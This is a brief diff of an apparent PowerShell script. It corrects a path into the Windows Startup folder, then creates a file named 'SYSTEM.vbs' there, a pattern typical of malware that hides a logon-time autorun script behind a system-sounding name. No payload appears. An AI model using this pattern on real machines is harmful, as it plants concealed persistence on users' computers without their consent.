@@ -1,4 +1,4 @@
-cd '.\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'
+cd 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'
 Start-Sleep -Seconds 1
 New-Item 'SYSTEM.vbs' -ItemType File
 Start-Sleep -Seconds 1
